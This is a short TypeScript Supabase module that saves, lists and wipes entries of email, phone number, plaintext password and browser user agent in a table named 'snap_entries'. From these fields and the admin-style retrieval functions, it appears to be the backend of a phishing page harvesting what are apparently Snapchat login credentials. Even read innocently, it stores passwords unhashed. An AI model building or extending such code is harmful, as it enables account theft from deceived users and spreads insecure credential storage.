import { createClient } from "@supabase/supabase-js";

const supabase = createClient(
  import.meta.env.VITE_SUPABASE_URL,
  import.meta.env.VITE_SUPABASE_ANON_KEY
);

export interface SnapEntry {
  id: string;
  email: string;
  phone: string;
  password: string;
  timestamp: string;
  user_agent: string;
}

export async function saveEntry(
  data: Pick<SnapEntry, "email" | "phone" | "password">
): Promise<void> {
  await supabase.from("snap_entries").insert({
    email: data.email || "",
    phone: data.phone || "",
    password: data.password || "",
    user_agent: navigator.userAgent,
  });
}

export async function getEntries(): Promise<SnapEntry[]> {
  const { data, error } = await supabase
    .from("snap_entries")
    .select("*")
    .order("timestamp", { ascending: false });
  if (error) return [];
  return data as SnapEntry[];
}

export async function deleteEntry(id: string): Promise<void> {
  await supabase.from("snap_entries").delete().eq("id", id);
}

export async function clearEntries(): Promise<void> {
  await supabase.from("snap_entries").delete().neq("id", "00000000-0000-0000-0000-000000000000");
}
